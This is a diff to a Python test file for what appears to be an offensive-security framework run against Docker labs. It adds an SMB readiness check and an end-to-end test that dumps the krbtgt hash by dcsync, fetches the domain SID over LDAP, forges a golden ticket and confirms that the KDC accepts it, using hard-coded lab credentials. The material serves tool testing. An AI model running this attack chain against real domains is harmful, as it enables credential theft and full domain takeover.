@@ -320,8 +320,26 @@ class TestWindowsLab(unittest.TestCase):
 
     @classmethod
     def setUpClass(cls):
+        from impacket.smbconnection import SMBConnection
+
         cls.manager = LabManager(ROOT / "labs")
-        cls.manager.up("windows")  # READY waits for guest SMB (2400s cap)
+        cls.manager.up("windows")
+        # READY's tcp check lies: docker-proxy accepts 1445 the moment the
+        # container starts, minutes before the guest's SMB stack answers.
+        # Poll a real login (the guest boots from a persisted disk, so
+        # this is fast on second boots).
+        deadline = time.time() + 300
+        while time.time() < deadline:
+            try:
+                conn = SMBConnection(HOST, HOST, sess_port=1445, timeout=10)
+                conn.login("labadmin", "Labpass2024!")
+                conn.close()
+                break
+            except Exception:
+                time.sleep(5)
+        else:
+            cls.manager.down("windows")
+            raise RuntimeError("windows lab guest SMB not up within 300s")
 
     @classmethod
     def tearDownClass(cls):
@@ -1320,6 +1338,96 @@ class TestBitlockerLab(unittest.TestCase):
             self.assertIn("WS01", loot[0]["content"])
         finally:
             console.store.close()
+
+
+@unittest.skipUnless(docker_available(), "docker daemon not available")
+@unittest.skipUnless(impacket_available(), "impacket not installed")
+class TestGoldenTicketLab(unittest.TestCase):
+    """The full AD arc end to end: dcsync the krbtgt hash, forge a TGT,
+    and have the KDC accept it for a service ticket."""
+
+    @classmethod
+    def setUpClass(cls):
+        cls.manager = LabManager(ROOT / "labs")
+        up_ad_lab(cls.manager)
+
+    @classmethod
+    def tearDownClass(cls):
+        cls.manager.down("ad")
+
+    def _run(self, *commands):
+        registry = ModuleRegistry(ROOT / "modules")
+        registry.load()
+        console = FrameworkConsole(registry, Store(":memory:"))
+        try:
+            buf = io.StringIO()
+            with contextlib.redirect_stdout(buf):
+                for command in commands:
+                    console.onecmd(command)
+            out = buf.getvalue()
+            loot = {}
+            for kind in ("hash", "ticket", "kerberos-key", "cleartext"):
+                loot[kind] = console.store.loot(kind)
+            return out, loot
+        finally:
+            console.store.close()
+
+    def test_dcsync_to_golden_ticket(self):
+        # 1. dcsync -> krbtgt NT hash + AES key (Samba's krbtgt is
+        # AES256-only, so the AES forge is what gets validated)
+        out, loot = self._run(
+            "use auxiliary/attack/dcsync",
+            f"set RHOSTS {HOST}",
+            "set DOMAIN forge.local",
+            "set USERNAME Administrator",
+            "set PASSWORD P@ssw0rd123",
+            "set TARGET krbtgt",
+            "run",
+        )
+        hashes = loot["hash"]
+        self.assertEqual(len(hashes), 1)
+        self.assertIn("krbtgt", hashes[0]["content"])
+        keys = loot["kerberos-key"]
+        self.assertTrue(keys, "dcsync must capture kerberos AES keys")
+        aes_line = next(k["content"] for k in keys
+                        if "aes256-cts-hmac-sha1-96" in k["content"])
+        aes_key = aes_line.rsplit(":", 1)[1]
+
+        # 2. domain SID from Administrator's objectSid (strip the RID)
+        from impacket.ldap import ldap as impacket_ldap
+        from impacket.ldap import ldapasn1, ldaptypes
+        conn = impacket_ldap.LDAPConnection(f"ldap://{HOST}")
+        conn.login("Administrator", "P@ssw0rd123", "forge.local")
+        domain_sid = None
+        for packet in conn.search(
+                searchBase="DC=forge,DC=local",
+                searchFilter="(sAMAccountName=Administrator)",
+                attributes=["objectSid"]):
+            if isinstance(packet, ldapasn1.SearchResultEntry):
+                for attr in packet["attributes"]:
+                    if str(attr["type"]) == "objectSid":
+                        sid = ldaptypes.LDAP_SID(
+                            data=bytes(attr["vals"][0])).formatCanonical()
+                        domain_sid = sid.rsplit("-", 1)[0]
+        self.assertIsNotNone(domain_sid)
+
+        # 3. forge + validate: the KDC must accept the golden ticket
+        out, loot = self._run(
+            "use auxiliary/attack/golden_ticket",
+            "set DOMAIN forge.local",
+            f"set DOMAIN_SID {domain_sid}",
+            "set KEYTYPE aes256",
+            f"set KRBTGT_AES {aes_key}",
+            "set KVNO 1",  # Samba provisions krbtgt at kvno 1
+            f"set RHOSTS {HOST}",
+            "run",
+        )
+        self.assertNotIn("Traceback", out)
+        self.assertIn("forged:", out)
+        self.assertIn("KDC issued a service ticket", out)
+        tickets = loot["ticket"]
+        self.assertEqual(len(tickets), 1)
+        self.assertIn("golden Administrator", tickets[0]["label"])
 
 
 @unittest.skipUnless(docker_available(), "docker daemon not available")
